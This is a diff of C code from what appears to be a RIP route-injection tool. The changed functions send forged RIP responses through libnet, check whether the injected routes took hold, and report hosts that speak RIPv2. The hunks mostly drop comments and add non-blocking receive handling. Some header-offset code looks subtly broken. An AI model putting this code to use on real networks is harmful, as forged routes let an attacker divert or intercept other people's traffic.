@@ -163,7 +163,7 @@ send_fake_rip_response()
 		entries->netmask = routes[1][i];
 		entries->gateway = routes[2][i];
 		entries->metric = routes[3][i];
-		entries++;				// RISCHIO SEGFAULT
+		entries++;
 		}
 	
         l = libnet_init(LIBNET_RAW4, dev, errbuf);
@@ -246,7 +246,7 @@ check_injection()
                 entries->netmask = routes[1][i];
                 entries->gateway = routes[2][i];
                 entries->metric = routes[3][i];
-                entries++;                              // RISCHIO SEGFAULT
+                entries++;
 	}	
 		
 	peer.sin_family = AF_INET;
@@ -256,13 +256,17 @@ check_injection()
 	if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) 
 		fatal(" failed to create socket: %s\n\n", strerror(errno));
 	
-	sleep(5);	//tempo di sicurezza per permettere alla route di essere "digerita"
+	fcntl(sock, F_SETFL, O_NONBLOCK);
+	
+	sleep(5);
 
 	while (1) {
 		rippo = (struct rip_message *) (buffer + 4);
 		if (sendto(sock, buffer_pkt, sizeof(struct rip)+sizeof(struct rip_message)*w, 0, (struct sockaddr *) & peer, sizeof(peer)) < 0)
 			fatal("  failed to send packets: %s\n\n", strerror(errno));
-		letti = recvfrom(sock, buffer, BUFLEN, 0, NULL, NULL);
+		sleep(1);
+		if ((letti = recvfrom(sock, buffer, BUFLEN, 0, NULL, NULL)) < 0) printf("\nNo Response, Are you in a RIPv2 Lan?\n");
+		
 		for (i = 0; i < w; i++) {
 			for (; (u_long) * (&rippo) < (u_long) (&buffer) + letti; rippo++) {
 				if (rippo->ip == routes[0][i]) {
@@ -288,14 +292,13 @@ void pack_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *
   struct iphdr *ip;
   struct rip_message *rip_head;
   struct udphdr *udp;
-  char *out = in_ntoa((unsigned long *)handle);
   
   ip = (struct iphdr *)(packet + sizeof_datalink(handle));
   rip_head = (struct rip_message *)(packet + sizeof_datalink(handle) + \
 		   			     sizeof(ip) +    \
 					     sizeof(udp) + 4);
   
- printf(" HOST %s SPEAKS RIPv%i!!\n", out , *(packet+sizeof_datalink(handle) + \
+ printf(" HOST %s SPEAKS RIPv%i!!\n", in_ntoa((unsigned long)handle) , *(packet+sizeof_datalink(handle) + \
 			   					    sizeof(ip) + \
 								    sizeof(udp)+1));
  printf(" *-*-*-*-*-*-*-*-*-*-*-*-*\n");
